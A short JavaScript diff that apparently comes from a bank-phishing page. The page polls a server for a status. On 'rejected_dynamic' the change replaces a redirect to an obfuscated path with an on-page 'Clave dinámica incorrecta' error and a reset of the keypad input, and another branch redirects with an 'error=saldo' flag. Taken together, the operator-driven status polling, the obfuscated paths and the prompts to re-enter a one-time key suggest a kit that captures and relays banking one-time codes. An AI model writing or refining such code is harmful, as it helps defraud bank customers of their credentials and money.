@@ -111,7 +111,26 @@ document.addEventListener('DOMContentLoaded', () => {
                     window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=saldo';
                 } else if (statusData.status === 'rejected_dynamic') {
                     clearInterval(pollInterval);
-                    window.location.href = '/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj?error=dynamic';
+
+                    // Hide loading overlay
+                    const overlay = document.getElementById('loading-overlay');
+                    if (overlay) {
+                        overlay.style.display = 'none';
+                    }
+
+                    // Show error message
+                    const errorDiv = document.getElementById('error-message');
+                    if (errorDiv) {
+                        errorDiv.textContent = 'Clave dinámica incorrecta';
+                        errorDiv.style.display = 'block';
+                        setTimeout(() => {
+                            errorDiv.style.display = 'none';
+                        }, 3000);
+                    }
+
+                    // Reset input
+                    currentInput = [];
+                    updateDisplay();
                 }
             })
             .catch(err => console.error('Polling error:', err));
